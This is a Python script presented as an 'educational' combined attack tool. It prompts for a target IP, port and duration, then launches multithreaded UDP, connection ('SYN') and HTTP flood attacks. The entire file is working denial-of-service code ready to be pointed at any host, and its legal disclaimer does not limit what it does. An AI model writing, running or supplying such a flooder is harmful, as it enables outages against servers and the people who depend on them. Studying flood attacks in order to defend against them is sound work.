import os
import sys
import socket
import random
import time
from datetime import datetime
from termcolor import colored
from threading import Thread

# Banner
def show_banner():
    os.system("clear")
    print("""
    *******************************************
    *            Combined Attack Tool         *
    *         Created for Educational Use     *
    *******************************************
    """)
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# UDP Flood Attack
def udp_flood(ip, port, duration, threads, bytes_to_send):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(bytes_to_send)
        sent_packets = 0
        timeout = time.time() + duration

        print(colored(f"Starting UDP Flood attack on {ip}:{port}", "yellow"))
        while time.time() < timeout:
            try:
                sock.sendto(payload, (ip, port))
                sent_packets += 1
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nUDP Flood attack completed.", "green"))

# SYN Flood Attack
def syn_flood(ip, port, duration, threads):
    def attack():
        timeout = time.time() + duration
        sent_packets = 0

        print(colored(f"Starting SYN Flood attack on {ip}:{port}", "yellow"))
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sent_packets += 1
                sock.close()
            except socket.error:
                pass
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nSYN Flood attack completed.", "green"))

# HTTP Flood Attack
def http_flood(ip, port, duration, threads):
    def attack():
        timeout = time.time() + duration
        sent_requests = 0
        request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode()

        print(colored(f"Starting HTTP Flood attack on {ip}:{port}", "yellow"))
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.sendall(request)
                sent_requests += 1
                sock.close()
            except socket.error:
                pass
            except KeyboardInterrupt:
                break

    for _ in range(threads):
        Thread(target=attack).start()

    print(colored("\nHTTP Flood attack completed.", "green"))

# Main Function
def main():
    show_banner()

    # Auswahl des Modus
    print("1. Start original tool (basic attacks)")
    print("2. Start enhanced tool (custom threads and byte size)")
    mode = input(colored("Select mode (1/2): ", "cyan"))

    if mode == "1":
        basic_mode()
    elif mode == "2":
        enhanced_mode()
    else:
        print(colored("Invalid choice. Exiting...", "red"))
        sys.exit()

def basic_mode():
    ip, port, duration, attack_type = get_user_input()
    if attack_type == "1":
        udp_flood(ip, port, duration, threads=1, bytes_to_send=1024)
    elif attack_type == "2":
        syn_flood(ip, port, duration, threads=1)
    elif attack_type == "3":
        http_flood(ip, port, duration, threads=1)
    else:
        print(colored("Invalid choice. Exiting...", "red"))
        sys.exit()

def enhanced_mode():
    ip, port, duration, attack_type = get_user_input()
    try:
        threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
        bytes_to_send = int(input(colored("Enter bytes per packet (Max: 65535): ", "cyan")))

        if threads > 100:
            threads = 100
        if bytes_to_send > 65535:
            bytes_to_send = 65535
    except ValueError:
        print(colored("Invalid input. Exiting...", "red"))
        sys.exit()

    if attack_type == "1":
        udp_flood(ip, port, duration, threads, bytes_to_send)
    elif attack_type == "2":
        syn_flood(ip, port, duration, threads)
    elif attack_type == "3":
        http_flood(ip, port, duration, threads)
    else:
        print(colored("Invalid choice. Exiting...", "red"))
        sys.exit()

def get_user_input():
    ip = input(colored("Enter target IP: ", "cyan"))
    try:
        port = int(input(colored("Enter target port: ", "cyan")))
        duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    except ValueError:
        print(colored("Invalid input. Exiting...", "red"))
        sys.exit()

    # Select attack type
    print("\nSelect attack type:")
    print("1. UDP Flood")
    print("2. SYN Flood")
    print("3. HTTP Flood")
    attack_type = input(colored("Enter choice (1/2/3): ", "cyan"))

    return ip, port, duration, attack_type

if __name__ == "__main__":
    main()
